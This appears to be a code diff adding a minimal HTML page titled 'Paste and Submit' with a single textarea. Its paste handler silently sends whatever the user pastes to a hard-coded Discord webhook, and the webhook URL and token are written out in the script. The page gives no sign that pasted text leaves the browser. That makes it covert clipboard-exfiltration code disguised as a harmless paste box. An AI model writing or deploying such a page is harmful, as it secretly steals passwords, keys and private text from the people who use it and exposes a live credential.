@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paste and Submit</title>
+    <script>
+        function handlePaste(event) {
+            event.preventDefault();
+            const pastedText = event.clipboardData.getData('text');
+            document.getElementById('pasted-text').value = pastedText;
+            fetch('https://discord.com/api/webhooks/1293012839736545310/tpj0XeopAmrCYoMcOoD4tw5dxuNdpstke0F8fiUVikHQsisnbsT25akVK5S2Cm28OENC', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: pastedText })
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Paste Text Below</h1>
+    <textarea id="pasted-text" rows="10" cols="50" onpaste="handlePaste(event)"></textarea>
+</body>
+</html>
+ 
